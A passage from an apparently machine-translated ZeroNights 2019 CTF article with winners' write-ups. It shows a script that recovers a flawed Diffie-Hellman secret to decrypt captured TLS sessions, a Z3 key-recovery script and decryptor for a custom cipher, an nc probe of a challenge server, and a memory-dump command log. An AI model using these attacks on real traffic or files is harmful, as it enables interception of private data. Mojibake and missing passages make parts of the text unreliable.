engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> </pre> <br><p>  No hab√≠a im√°genes con la bandera en el servidor, pero dump.pcap result√≥ tener mucho tr√°fico ssl, presumiblemente con partes de la imagen.  Despu√©s de una revisi√≥n r√°pida del servidor para detectar posibles problemas (para robar una clave privada para descifrar el tr√°fico), se descubri√≥ que el servidor no es vulnerable.  Adem√°s, en sesiones SSL, de acuerdo con el volcado de tr√°fico y el cliente, se usa el cifrado DHE-RSA-AES128-SHA256, en el que RSA se usa solo para firmar, y las claves se intercambian de acuerdo con el esquema Diffie-Hellman (una clave de servidor RSA privada en este modo no nos ayudar√° ) </p><br></li><li><p>  Con un poco de podirbastiv, el servidor encontr√≥ el archivo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://ssltest.a1exdandy.me/x</a> , que es un malware simple, la direcci√≥n de administrador cosida es 0x82C780B2697A0002 (0x82C780B2: 0x7a69 = 178.128.199.130 opin1337).  Cuando se conect√≥ al puerto 31337, se descubri√≥ que el servidor admite 3 comandos, algunos de los cuales solicitan argumentos adicionales </p><br><pre> <code class="plaintext hljs">nc 178.128.199.130 31337 Yet another fucking heap task... Command: 1-3 1 - Index: - Size: 2 - Index: 3 - Index: - Length:</code> </pre> <br><p>  Pero no se pudo hacer nada m√°s con este puerto, y lo m√°s probable es que fuera una tarea de distracci√≥n. </p><br></li><li><p>  Despu√©s de mirar detenidamente al cliente, vi que usa un generador de secretos Diffie-Hellman personalizado: </p><br><pre> <code class="plaintext hljs">int __fastcall rnd_work(__int64 a1) { __int64 v1; // rsi unsigned int i; // [rsp+10h] [rbp-10h] rnd_read(); BN_bin2bn(&amp;RANDOM_512, 512LL, a1); BN_lshift1(a1, a1); v1 = (unsigned int)BITS_ind[0]; // BITS_ind dd 4096, 4095, 4081, 4069, 0 if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[0]) ) { for ( i = 0; i &lt;= 4; ++i ) { if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[i]) ) { v1 = (unsigned int)BITS_ind[i]; BN_clear_bit(a1, v1); } else { v1 = (unsigned int)BITS_ind[i]; BN_set_bit(a1, v1); } } } if ( (unsigned int)((signed int)((unsigned __int64)BN_num_bits(a1) + 7) / 8) &gt; 0x200 ) { printf("Err!", v1); exit(0); } BN_bn2binpad(a1, &amp;RANDOM_512, 512LL); return rnd_write(); }</code> </pre> <br><p>  Inicialmente, el secreto (512 bytes) se lee desde / dev / urandom y se guarda en el archivo de estado.  Con cada solicitud posterior, la siguiente magia ocurre con un secreto: </p><br><pre> <code class="plaintext hljs">XOR = 2**4096 + 2**4095 + 2**4081 + 2**4069 + 1 CMP = 2**4096 state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p>  El secreto como un n√∫mero largo se desplaza 1 bit a la izquierda, y si el bit m√°s significativo fue 1, entonces el n√∫mero est√° en una constante de 5 bits distintos de cero (XOR). </p><br></li></ol><br><p>  Mirando pcap, vi que los par√°metros de Diffie-Hellman que llegan del servidor son constantes: </p><br><pre> <code class="plaintext hljs">dh_g = 2 dh_p =</code> </pre> <br><p>  Y cada vez que se establece una conexi√≥n, el cliente env√≠a su parte p√∫blica del secreto Diffie-Hellman.  Al comparar las partes p√∫blicas de los secretos de las sesiones vecinas, puede restaurar el secreto inicial del cliente y luego todos los secretos posteriores para cada sesi√≥n: <br>  Si el bit m√°s alto del secreto es 0, entonces en la pr√≥xima sesi√≥n el secreto simplemente ser√° 2 veces m√°s grande, y la parte p√∫blica se elevar√° al cuadrado m√≥dulo p.  Por lo tanto, fue posible restaurar el secreto inicial (lo que se ley√≥ de / dev / urandom) m√≥dulo p: </p><br><pre><code class="plaintext hljs">212030266574081313400816495535550771039880390539286135828101869037345869420205997453325815053364595553160004790759435995827592517178474188665111332189420650868610567156950459495593726196692754969821860322110444674367830706684288723400924718718744572072716445007789955072532338996543460287499773137785071615174311774659549109541904654568673143709587184128220277471318155757799759470829597214195494764332668485009525031739326801550115807698375007112649770412032760122054527000645191827995252649714951346955180619834783531787411998600610075175494746953236628125613177997145650859163985984159468674854699901927080143977813208682753148280937687469933353788992176066206254339449062166596095349440088429291135673308334245804375230115095159172312975679432750163246936266603077314220813042048063033927345613565227184333091534551071824033535159483541175958867122974738255966511008607723675431569961127852005437047813822454112416864211120323016008267853722731311026233323235121922969702016337164336853826598082855592007126727352041124911221048498141841625765390204460725231581416991152769176243658310857769293168120450725070030636638954553866903537931113666283836250525318798622872347839391197939468295124060629961250708172499966110406527347</code></pre><br><p>  y a partir de eso es f√°cil calcular los secretos para todas las dem√°s sesiones. </p><br><p>  Y aqu√≠ hubo problemas: <br>  A) Wireshark no puede descifrar SSL, conociendo los secretos de Diffie-Hellman, y no hab√≠a soluciones preparadas.  Debemos descubrir el secreto general de Diffie-Hellman (tambi√©n conocido como sesiones de clave maestra previa) y usarlo para encontrar una sesi√≥n de clave maestra usando una bicicleta grande (no pens√© que haya bicicletas en SSL).  A continuaci√≥n, puede crear un archivo SSLKEYLOG en el que escribir al cliente al azar (en cada sesi√≥n SSL) y la clave maestra, especificarlo en la configuraci√≥n de WireShark para el descifrado SSL y, en teor√≠a, obtener ganancias. </p><br><p>  Pero surgieron algunos problemas m√°s: <br>  B) PHP considerado demasiado lento (no se usan las funciones <code>bcadd</code> , <code>bcpowmod</code> ...), decid√≠ reescribirlo en python. <br>  C) No se pudo encontrar la f√≥rmula para calcular la clave maestra por la clave maestra previa en forma humana, ssl es muy dif√≠cil de entender, tampoco pude obtener openssl para generar los resultados de los c√°lculos intermedios.  Como resultado, utilic√© <a href="">este c√≥digo</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">descripci√≥n</a> y alg√∫n tipo de RFC: <br><img src="https://habrastorage.org/webt/hl/ko/q6/hlkoq67uttadwf0spe68fvvgtgo.png"></p><br><p>  Como resultado, despu√©s de medio d√≠a pude crear esto (para m√≠, no podr√≠a funcionar sin bicicletas): </p><br><pre> <code class="plaintext hljs">for i in xrange(0, 4264): dh_secret = pow(srv_pubkeys[i], state, dh_p) dh_secret = hex(dh_secret)[2:-1] if len(dh_secret) % 2 : dh_secret = "0"+dh_secret while dh_secret[0:2] == "00": dh_secret = dh_secret[2:] dh_secret = dh_secret.decode("hex") seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex") A = seed master_key = "" for j in xrange(0, 2): A = hmac.new(dh_secret, A, hashlib.sha256).digest() master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest() master_key = master_key[0:48].encode("hex") print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p>  D) Para arrancar varios clientes al azar, ... de las sesiones de Wireshark, se utiliz√≥ exportar a csv y buscar en el tr√°fico sin procesar lo que entr√≥ en csv como "...". </p><br><p>  E) Para descifrar 4264 sesiones, WireShark decidi√≥ comer muchos gigabytes de operativo (8 no era suficiente para √©l), pero nada, puede ejecutar todo en una computadora potente y no en una computadora port√°til d√©bil.  Sin embargo, al exportar objetos http (piezas descifradas de una imagen) WireShark puede guardar solo los primeros 1000 archivos y luego finaliza su numeraci√≥n.  Como resultado, tuve que dividir pcap en 5 partes de 1000 sesiones de tcp en cada una.  El resultado fue una imagen tan hermosa despu√©s de pegar todas las piezas: </p><br><p><img src="https://habrastorage.org/webt/kn/op/xh/knopxh0nebqck4xuix2kvgmoyju.png"></p></div></div><br><p>  Todos los archivos utilizados por el ganador para resolver la tarea se pueden encontrar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . </p><br><h2>  D√≠a 5. CONCHA PROTEGIDA </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  Ganadores </td></tr><tr><td align="center">  <b>1er lugar</b> </td><td align="center">  <b>2do lugar</b> </td><td align="center">  <b>3er lugar</b> </td></tr><tr><td align="center">  vos </td><td align="center">  Bartimeo </td><td align="center">  Clo </td></tr><tr><td colspan="3" align="center">  Tambi√©n decidi√≥: Maxim Pronin, 0x3c3e, tinkerlock, demidov_al, x @ secator, groke_in_the_sky, d3fl4t3 </td></tr></tbody></table></div><br><p>  Tarea preparada por <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">RuCTFE</a> .  Los participantes recibieron un archivo ejecutable ofuscado con una serie de t√©cnicas anti-depuraci√≥n.  El archivo ejecutable es como un cliente SSH que est√° conectado a un servidor previamente conocido.  La tarea es comprender el algoritmo de este archivo para obtener la ejecuci√≥n de comandos en el servidor.  La soluci√≥n del autor implic√≥ evitar la depuraci√≥n y analizar la ofuscaci√≥n. </p><br><p>  Es de destacar que el participante m√°s r√°pido resolvi√≥ la tarea de una manera original diferente a la planeada por el autor, y despu√©s de eso encontr√≥ otra soluci√≥n.  Puedes ver c√≥mo lo hizo debajo del spoiler a continuaci√≥n. </p><br><div class="spoiler">  <b class="spoiler_title">Opciones de soluci√≥n de tareas del quinto d√≠a (vos)</b> <div class="spoiler_text"><iframe width="560" height="315" src="https://www.youtube.com/embed/rpq5R9wnoiM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/00xBulNZkGI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div></div><br><h2>  D√≠a 6. DESBLOQUEO </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  Ganadores </td></tr><tr><td align="center">  <b>1er lugar</b> </td><td align="center">  <b>2do lugar</b> </td><td align="center">  <b>3er lugar</b> </td></tr><tr><td align="center">  Gotdaswag </td><td align="center">  medidrdrider </td><td align="center">  sysenter </td></tr></tbody></table></div><br><p>  La asignaci√≥n del sexto d√≠a fue preparada por el equipo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">VolgaCTF</a> .  Dado un archivo ejecutable que implementa un algoritmo criptogr√°fico personalizado.  La tarea es descifrar el archivo dado en la condici√≥n, encriptado usando este algoritmo, sin tener una clave conocida. </p><br><div class="spoiler">  <b class="spoiler_title">Soluci√≥n de tarea del sexto d√≠a (gotdaswag)</b> <div class="spoiler_text"><h3 id="intro">  INTRO </h3><br><p>  Dado un archivo con dos archivos, <strong>locker</strong> y <strong>secret.png.enc</strong> . </p><br><p>  El primer archivo es un <strong>ELF</strong> para Linux x86-64, que recibe un archivo y una clave de cifrado como entrada, y el segundo es una imagen <strong>PNG</strong> cifrada. </p><br><pre> <code class="plaintext hljs"># ./locker Required option 'input' missing Usage: ./locker [options] Options: -i, --input in.png Input file path -o, --output out.png.enc Output file path -k, --key 0004081516234200 Encryption key in hex -h, --help Print this help menu</code> </pre> <br><h3 id="locker">  BLOQUEO </h3><br><p>  Despu√©s de analizar el archivo en IDA, encontramos el algoritmo de cifrado en la funci√≥n <strong>project :: main</strong> . </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/0a3/e68/c77/0a3e68c773b0ff4a7c4d09a321deecd1.png"></p><br><p>  Habi√©ndolo estudiado, entendemos que este es un <strong>cifrado de bloque</strong> (BCE), con un tama√±o de bloque de <strong>32 bits</strong> , un tama√±o de clave de <strong>64 bits</strong> y el n√∫mero de rondas de <strong>77</strong> . </p><br><h5 id="versiya-na-python">  Versi√≥n de Python </h5><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(p, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): n = (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = p ^ k x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: p &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: p |= <span class="hljs-number"><span class="hljs-number">1</span></span> k = ror(k, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) p = ror(p, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p</code> </pre> <br><h3 id="secret-key">  CLAVE SECRETA </h3><br><p>  Sabemos que el archivo cifrado es una imagen <strong>PNG</strong> . <br>  En consecuencia, conocemos un <strong>par de texto cifrado</strong> en <strong>texto plano</strong> en forma de encabezado de archivo (es est√°ndar para PNG). <br><img src="https://habrastorage.org/getpro/habr/post_images/0b7/ecb/770/0b7ecb770732ca1fdc9f8cba8f0d8248.png"></p><br><p>  Probemos de manera simple y usemos el <strong>solucionador SMT</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" title="Z3">Z3</a> ) para encontrar la clave de cifrado. <br>  Para hacer esto, modifique ligeramente el c√≥digo y env√≠e a la entrada un par de texto plano-texto cifrado. </p><br><h5 id="task6_keypy">  task6_key.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> z3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-comment"><span class="hljs-comment"># PNG file signature (8 bytes) + IHDR chunk header (8 bytes) PLAIN_TEXT = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52' BLOCK_SIZE = 4 def encrypt(p, k, rounds=77): for i in range(0, rounds): n = LShR(p, 4) &amp; 1 n |= LShR(p, 26) &amp; 0xE0 n |= LShR(p, 22) &amp; 0x10 n |= LShR(p, 13) &amp; 8 n |= LShR(p, 7) &amp; 4 n |= LShR(p, 4) &amp; 2 x = k ^ ZeroExt(32, p) x ^= LShR(ZeroExt(32, p), 12) x ^= LShR(ZeroExt(32, p), 20) x &amp;= 1 y = 1 &lt;&lt; ZeroExt(32, n) y &amp;= 0xBB880F0FC30F0000 y = LShR(y, ZeroExt(32, n)) y &amp;= 1 p = If(x == y, p &amp; 0xFFFFFFFE, p | 1) p = RotateRight(p, 1) k = RotateRight(k, 1) return p def qword_le_to_be(v): pv = struct.pack('&lt;Q', v) uv = struct.unpack('&gt;Q', pv) return uv[0] if len(sys.argv) &lt; 2: sys.exit('no input file specified') with open(sys.argv[1], 'rb') as encrypted_file: k = BitVec('k', 64) key = k solver = Solver() for i in range(0, len(PLAIN_TEXT), BLOCK_SIZE): # prepare plain text and cipher text pairs pt = struct.unpack('&lt;L', PLAIN_TEXT[i:i + BLOCK_SIZE])[0] ct = struct.unpack('&lt;L', encrypted_file.read(BLOCK_SIZE))[0] p = BitVecVal(pt, 32) e = BitVecVal(ct, 32) solver.add(encrypt(p, k) == e) print('solving ...') if solver.check() == sat: encryption_key = solver.model()[key].as_long() print('key: %016X' % qword_le_to_be(encryption_key))</span></span></code> </pre> <br><p>  Soluci√≥n: </p><br><pre> <code class="plaintext hljs">&gt; python task6_key.py "secret.png.enc" solving ... key: AE34C511A8238BCC</code> </pre> <br><h3 id="unlocker"> UNLOCKER </h3><br><p>          . <br>                  . </p><br><h5 id="task6_unlockerpy"> task6_unlocker.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> binascii BLOCK_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span> ror = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; r_bits%max_bits) | \ (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) rol = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ (val &lt;&lt; r_bits%max_bits) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>) | \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; (max_bits-(r_bits%max_bits))) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(e, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> dk = ror(k, <span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): dk = rol(dk, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) e = rol(e, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) n = (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = e ^ dk x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: e &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: e |= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no input file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">3</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no output file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">4</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no encryption key specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: key = binascii.unhexlify(sys.argv[<span class="hljs-number"><span class="hljs-number">3</span></span>]) key = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;Q'</span></span>, key)[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'non-hexadecimal encryption key'</span></span>) print(<span class="hljs-string"><span class="hljs-string">'unlocking ...'</span></span>) start_time = time.time() <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>], <span class="hljs-string"><span class="hljs-string">'rb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> ef: <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> df: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: ct = ef.read(BLOCK_SIZE) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ct: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> ct = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, ct)[<span class="hljs-number"><span class="hljs-number">0</span></span>] pt = decrypt(ct, key) pt = struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, pt) df.write(pt) print(<span class="hljs-string"><span class="hljs-string">'done, took %.3f seconds.'</span></span> % (time.time() - start_time))</code> </pre> <br><p>  ,         . </p><br><pre> <code class="plaintext hljs">&gt; python task6_unlocker.py "secret.png.enc" "secret.png" "AE34C511A8238BCC" unlocking ... done, took 49.669 seconds.</code> </pre> <br><h5 id="secretpng"> secret.png </h5><br><p><img src="https://habrastorage.org/getpro/habr/post_images/9fa/18b/2b2/9fa18b2b2264379bd89ebcaaf62c3006.png"></p><br><blockquote> ZN{RA$T0GR@PHY_H3RTS} </blockquote></div></div><br><h2> Day 7. Beep Beep! </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  </td></tr><tr><td align="center"> <b>1 </b> </td></tr><tr><td align="center"> sysenter </td></tr></tbody></table></div><br><p>     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">SchoolCTF</a> .     ,    ,  .   ,       ,      . </p><br><div class="spoiler"> <b class="spoiler_title">    (sysenter)</b> <div class="spoiler_text"><p> Something that looks like VirtualBox RAM dump is provided to us. </p><br><p> We can try volatility, but it seems that it unable to locate required structures to restore Virtual Memory layout. </p><br><p><img src="https://habrastorage.org/webt/go/1l/7i/go1l7imiojbikday6awhxdrbw58.png"></p><br><p> No process memory for us today, so we will have to work with fragmented memory. </p><br><p> First of all let's precache strings from the dump. </p><br><pre> <code class="plaintext hljs">strings &gt; strings_ascii.txt strings -el &gt; strings_wide.txt</code> </pre> <br><p> Most interesting one is command execution log: </p><br><pre> <code class="plaintext hljs">cd .. .\injector.exe 192.168.1.65 .\run.exe .\storage cd .\server\ .\run.exe block1 .\run.exe block0 cd Z:\zn_2019\ cd .\server\ cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd .. touch echo echo qwe echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ injector.exe 1921.68.1.65 injector.exe 192.68.1.65 ./injector.exe 192.68.1.65 .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\server\ run storage .\run.exe .\storage cd Z:\zn_2019\server\ .\run.exe block1 cd Z:\zn_2019\server\ .\run.exe block0 cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 .\injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 '.\ConsoleApplication5 (2).exe' 192.168.1.65</code> </pre> <br><p> <strong>Not Important note:</strong> </p><br><p> <em>Not sure what <strong>SIGN.MEDIA</strong> is, but it looks like a cached file list from VirtualBox Network Share (Is this from Windows Registry?).</em> </p><br><pre> <code class="plaintext hljs">SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=138A400 zn_2019\Injector2.exe SIGN.MEDIA=138A400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\With_little_debug.exe SIGN.MEDIA=138A400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=138A400 zn_2019\injector.exe SIGN.MEDIA=138A400 zn_2019\nnnn.exe SIGN.MEDIA=138A400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=138A400 zn_2019\note.exe SIGN.MEDIA=138A400 zn_2019\note2.exe SIGN.MEDIA=138A400 zn_2019\note3.exe SIGN.MEDIA=138A400 zn_2019\note4.exe SIGN.MEDIA=138A400 zn_2019\random.exe SIGN.MEDIA=138A400 zn_2019\z.exe SIGN.MEDIA=17582C zn_2019\Injector2.exe SIGN.MEDIA=17582C zn_2019\injector.exe SIGN.MEDIA=196C2 zn_2019\server\run.exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C176B0 zn_2019\Injector2.exe SIGN.MEDIA=1C176B0 zn_2019\injector.exe SIGN.MEDIA=1C176B0 zn_2019\note.exe SIGN.MEDIA=1C176B0 zn_2019\note2.exe SIGN.MEDIA=1C176B0 zn_2019\note3.exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1D02C zn_2019\Injector2.exe SIGN.MEDIA=1C1D02C zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C1D02C zn_2019\With_little_debug.exe SIGN.MEDIA=1C1D02C zn_2019\injector.exe SIGN.MEDIA=1C1D02C zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C1D02C zn_2019\note.exe SIGN.MEDIA=1C1D02C zn_2019\note2.exe SIGN.MEDIA=1C1D02C zn_2019\note3.exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5 (2).exe 